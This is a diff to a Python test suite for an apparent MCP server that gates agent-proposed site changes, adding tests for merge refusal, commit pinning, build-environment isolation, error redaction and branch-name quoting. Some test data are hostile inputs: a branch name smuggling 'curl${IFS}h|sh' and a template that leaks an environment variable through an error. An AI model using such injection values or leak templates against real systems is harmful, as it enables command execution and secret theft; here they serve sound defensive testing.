@@ -15,6 +15,7 @@ import importlib.util
 import io
 import json
 import os
+import re
 import shlex
 import subprocess
 import sys
@@ -80,6 +81,8 @@ class GateCase(unittest.TestCase):
         self.addCleanup(root_patch.stop)
 
         self.gh_calls: list[list[str]] = []
+        self.cargo_calls: list[dict] = []
+        self.cargo_result = lambda cmd, kw: subprocess.CompletedProcess(cmd, 0, "", "")
 
         def fake_run(cmd, *a, **kw):
             if isinstance(cmd, list) and cmd and cmd[0] == "gh":
@@ -91,7 +94,12 @@ class GateCase(unittest.TestCase):
                     out = "https://forge.example.com/pr/7\n"
                 return subprocess.CompletedProcess(cmd, 0, out, "")
             if isinstance(cmd, list) and cmd[:1] == ["cargo"]:
-                return subprocess.CompletedProcess(cmd, 0, "", "")
+                cwd = Path(kw.get("cwd") or ".")
+                self.cargo_calls.append({"cmd": list(cmd), "cwd": cwd,
+                                         "env": dict(kw.get("env") or os.environ),
+                                         "build.rs": (cwd / "build.rs").exists()})
+                return self.cargo_result(cmd, kw)
+            return _REAL_RUN(cmd, *a, **kw)
             return _REAL_RUN(cmd, *a, **kw)
 
         run_patch = mock.patch.object(srv.subprocess, "run", fake_run)
@@ -192,6 +200,10 @@ class MergeTrueTest(GateCase):
         }
         for tool, args in calls.items():
             with self.subTest(tool=tool), self.as_user("alice", MCP_ALLOW_APPROVE="1"):
+                with self.assertRaisesRegex(ValueError, "refused over HTTP"):
+                    srv.HANDLERS[tool]({**args, "merge": True})
+            with self.subTest(tool=tool, transport="stdio"), \
+                    self.as_user("alice", transport="stdio", REQUIRE_DISTINCT_APPROVER="1"):
                 with self.assertRaisesRegex(ValueError, "cannot approve itself"):
                     srv.HANDLERS[tool]({**args, "merge": True})
         self.assertEqual(self.gh_calls, [], "a refused merge must not reach the forge")
@@ -199,9 +211,9 @@ class MergeTrueTest(GateCase):
         self.assertEqual(heads, "", "a refused merge must not push a branch")
 
     def test_approval_off_blocks_merge_true(self) -> None:
-        for env in ({}, {"MCP_ALLOW_APPROVE": "0"}):
+        for env in ({}, {"MCP_ALLOW_APPROVE": "1"}):
             with self.subTest(env=env), self.as_user("alice", **env):
-                with self.assertRaisesRegex(ValueError, "merging is disabled"):
+                with self.assertRaisesRegex(ValueError, "refused over HTTP"):
                     srv.tool_propose_change({"slug": "hello", "body": "hi", "merge": True})
         with self.as_user("alice", transport="stdio", MCP_ALLOW_APPROVE="0"):
             with self.assertRaisesRegex(ValueError, "merging is disabled"):
@@ -748,6 +760,137 @@ class WorktreeLimitsTest(GateCase):
         self.assertFalse(stale.exists())
         self.assertTrue(live.exists())
         self.git(self.work, "worktree", "remove", "--force", str(live))
+
+
+class BuildIsolationTest(GateCase):
+    """X2 (pinned sha) and the env leak (cleared build environment)."""
+
+    def test_x2_revise_checks_and_builds_the_same_commit(self) -> None:
+        """X2: the branch is moved to a harmless tip after checkout; the
+        checks must still run against the commit that was checked out."""
+        b = BranchContentTest.item_branch
+        benign_branch = b(self, "tt")
+        benign = self.git(None, "--git-dir", str(self.origin), "rev-parse", benign_branch)
+        self.git(self.work, "switch", "-q", "agent/tt")
+        (self.work / "build.rs").write_text("fn main() {}\n")
+        self.git(self.work, "add", "build.rs")
+        self.git(self.work, "commit", "-q", "-m", "evil", who="dave")
+        self.git(self.work, "push", "-q", "origin", "agent/tt")
+        self.git(self.work, "switch", "-q", "main")
+        real_add = srv._add_work_worktree
+
+        def add(kind, rev, fetch):
+            p = real_add(kind, rev, fetch)
+            # A concurrent call fetches after the attacker moved the branch
+            # back to the harmless tip.
+            self.git(None, "--git-dir", str(self.origin), "update-ref",
+                     "refs/heads/agent/tt", benign)
+            srv._git("fetch", "--quiet", "origin",
+                     "+refs/heads/agent/tt:refs/remotes/origin/agent/tt")
+            return p
+        with mock.patch.object(srv, "_add_work_worktree", add), self.as_user("bob"):
+            with self.assertRaisesRegex(ValueError, "outside content/posts/tt.*build.rs"):
+                srv.tool_revise_proposal({"slug": "tt", "body": "y\n"})
+        self.assertEqual(self.cargo_calls, [], "nothing was built")
+
+    def test_revise_push_is_leased_to_the_checked_commit(self) -> None:
+        BranchContentTest.item_branch(self, "lease")
+        real_add = srv._add_work_worktree
+
+        def add(kind, rev, fetch):
+            p = real_add(kind, rev, fetch)
+            # Someone pushes to the branch while the revise runs.
+            self.commit_on("agent/lease", "dave", "late.md", server=False)
+            return p
+        with mock.patch.object(srv, "_add_work_worktree", add), self.as_user("bob"):
+            with self.assertRaisesRegex(ValueError, "push failed"):
+                srv.tool_revise_proposal({"slug": "lease", "body": "y\n"})
+
+    def leaky_build(self, cmd, kw):
+        """Stand-in for the engine: a template calling
+        throw(message=get_env(name="LEAK")) fails with the value."""
+        env = kw.get("env") or os.environ
+        return subprocess.CompletedProcess(
+            cmd, 1, "", f"Error: template error: {env.get('LEAK', 'unset')}\n")
+
+    def test_env_leak_build_never_sees_server_secrets(self) -> None:
+        (self.work / "templates").mkdir()
+        (self.work / "templates" / "base.html").write_text("{% block content %}{% endblock %}\n")
+        self.git(self.work, "add", "templates")
+        self.git(self.work, "commit", "-q", "-m", "templates", who="dave")
+        self.git(self.work, "push", "-q", "origin", "main")
+        self.cargo_result = self.leaky_build
+        secret = "s3cr3t-probe-value"
+        with mock.patch.dict(os.environ, {"LEAK": secret, "GH_TOKEN": "probe-" + "y" * 20}), \
+                self.as_user("alice"):
+            with self.assertRaises(ValueError) as ctx:
+                srv.tool_propose_template({
+                    "name": "leak",
+                    "body": '{{ throw(message=get_env(name="LEAK")) }}{% block content %}{% endblock %}'})
+        self.assertNotIn(secret, str(ctx.exception))
+        self.assertIn("unset", str(ctx.exception))
+        env = self.cargo_calls[0]["env"]
+        self.assertNotIn("LEAK", env)
+        self.assertNotIn("GH_TOKEN", env)
+        self.assertNotEqual(env["HOME"], os.environ.get("HOME"))
+        self.assertEqual(env["SITE_ROOT"], str(self.cargo_calls[0]["cwd"]))
+        self.assertEqual(self.cargo_calls[0]["cmd"], srv.BUILD_CMD)
+
+    def test_build_error_output_is_redacted_and_truncated(self) -> None:
+        value = "-".join(["probe", "value", "from", "env"])
+        with mock.patch.dict(os.environ, {"PROBE_VAR": value}):
+            res = subprocess.CompletedProcess(
+                [], 1, "", "\x1b[31mred\x1b[0m\n" + "line\n" * 50 + value + "\n")
+            tail = srv._build_error_tail(res)
+        self.assertNotIn(value, tail)
+        self.assertNotIn("\x1b", tail)
+        self.assertLessEqual(len(tail.splitlines()), 15)
+
+    def test_list_proposals_quotes_the_branch(self) -> None:
+        evil = "agent/x;curl${IFS}h|sh"
+        real = srv.subprocess.run
+
+        def gh(cmd, *a, **kw):
+            if isinstance(cmd, list) and cmd[:3] == ["gh", "pr", "list"]:
+                return subprocess.CompletedProcess(cmd, 0, json.dumps([{
+                    "number": 1, "title": "t", "headRefName": evil, "url": "u",
+                    "author": {"name": "n"}, "body": ""}]), "")
+            return real(cmd, *a, **kw)
+        with mock.patch.object(srv.subprocess, "run", gh), \
+                mock.patch.object(srv, "_proposal_field_diff", return_value=[]):
+            out = srv.tool_list_proposals({})
+        cmd = out["proposals"][0]["preview_command"]
+        self.assertIn(shlex.quote(evil), cmd)
+        self.assertNotIn(f"git switch {evil} ", cmd)
+
+
+class BuildCommandTest(unittest.TestCase):
+    def test_build_command_names_the_binary(self) -> None:
+        """`cargo run -p build` is ambiguous (two binaries), so every server
+        build names build-site, which the build crate must declare."""
+        manifest = (_HERE.parent / "crates" / "build" / "Cargo.toml").read_text()
+        bins = re.findall(r'(?m)^name = "([^"]+)"\s*\npath', manifest)
+        self.assertIn("build-site", bins)
+        self.assertEqual(srv.BUILD_CMD[-2:], ["--bin", "build-site"])
+
+    @unittest.skipUnless(os.environ.get("PCMS_REAL_BUILD") == "1",
+                         "set PCMS_REAL_BUILD=1 to run the real engine (compiles the build crate)")
+    def test_real_build_runs_and_does_not_see_the_environment(self) -> None:
+        site = Path(tempfile.mkdtemp(prefix="pcms-real-build-"))
+        self.addCleanup(lambda: _REAL_RUN(["rm", "-rf", str(site)]))
+        archive = _REAL_RUN(["git", "-C", str(_HERE.parent), "archive", "HEAD"],
+                            capture_output=True)
+        _REAL_RUN(["tar", "-x", "-C", str(site)], input=archive.stdout, check=True)
+        with mock.patch.object(srv, "ROOT", site), \
+                mock.patch.dict(os.environ, {"LEAK": "s3cr3t-probe-value"}):
+            ok = srv._run_build(site)
+            self.assertEqual(ok.returncode, 0, srv._build_error_tail(ok))
+            self.assertTrue((site / "dist" / "index.html").exists())
+            (site / "templates" / "leak.html").write_text(
+                '{{ throw(message=get_env(name="LEAK")) }}\n')
+            bad = srv._run_build(site)
+        self.assertNotEqual(bad.returncode, 0)
+        self.assertNotIn("s3cr3t-probe-value", bad.stdout + bad.stderr)
 
 
 class HttpIdentityTest(unittest.TestCase):
